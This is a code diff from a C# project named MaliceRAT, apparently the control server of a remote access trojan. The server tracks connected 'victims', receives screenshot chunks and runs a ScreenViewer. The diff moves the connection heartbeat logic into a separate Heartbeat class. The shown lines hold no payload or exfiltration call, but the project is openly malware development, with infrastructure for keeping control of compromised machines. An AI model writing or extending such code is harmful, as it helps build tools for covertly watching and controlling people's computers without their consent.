@@ -8,6 +8,7 @@ using System.Runtime.InteropServices;
 using System.Web.Script.Serialization;
 using System.IO;
 using System.Windows.Forms;
+using MaliceRAT.RatServer.Features;
 
 namespace MaliceRAT.RatServer
 {
@@ -15,6 +16,7 @@ namespace MaliceRAT.RatServer
     {
         #region Features
         public ScreenViewer screenViewer = new ScreenViewer();
+        public Heartbeat heartbeatManager;
         #endregion
 
         #region Events
@@ -63,6 +65,8 @@ namespace MaliceRAT.RatServer
                 Console.WriteLine("config.json not found.");
                 Application.Exit();
             }
+
+            heartbeatManager = new Heartbeat(HeartbeatInterval, this);
         }
         #endregion
 
@@ -95,22 +99,7 @@ namespace MaliceRAT.RatServer
                 byte[] buffer = new byte[BufferSize];
                 int bytesRead;
 
-                System.Timers.Timer heartbeatTimer = new System.Timers.Timer(HeartbeatInterval);
-                bool heartbeatReceived = true;
-
-                heartbeatTimer.Elapsed += async (sender, e) =>
-                {
-                    if (!heartbeatReceived)
-                    {
-                        heartbeatTimer.Stop();
-                        stream.Close();
-                        OnClientDisconnected(client);
-                        return;
-                    }
-                    heartbeatReceived = false;
-                    await SendHeartbeat(stream);
-                };
-                heartbeatTimer.Start();
+                heartbeatManager.StartHeartbeat(stream, client);
 
                 while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) != 0)
                 {
@@ -141,7 +130,7 @@ namespace MaliceRAT.RatServer
                         }
                         else if (jsonMessage["type"] == "heartbeat")
                         {
-                            heartbeatReceived = true;
+                            heartbeatManager.ReceiveHeartbeat();
                         }
                         else if (jsonMessage["type"] == "screenshot_chunk")
                         {
@@ -165,7 +154,7 @@ namespace MaliceRAT.RatServer
                     }
                 }
                 
-                heartbeatTimer.Stop();
+                heartbeatManager.StopHeartbeat();
                 OnClientDisconnected(client);
             }
         }
@@ -182,21 +171,11 @@ namespace MaliceRAT.RatServer
             ClientConnected?.Invoke(client);
         }
 
-        protected virtual void OnClientDisconnected(Victim client)
+        public void OnClientDisconnected(Victim client)
         {
             victims.Remove(client);
             Console.WriteLine("Client disconnected: " + client.IP);
             ClientDisconnected?.Invoke(client);
-        }
-        
-        private async Task SendHeartbeat(NetworkStream stream)
-        {
-            var heartbeat = new { type = "heartbeat", text = "ping" };
-            Victim client = victims.Find(v => v.TcpClient.GetStream() == stream);
-            if (client != null)
-            {
-                await Task.Run(() => SendMessageTo(client, heartbeat));
-            }
         }
 
         public Victim GetVictimById(int id)
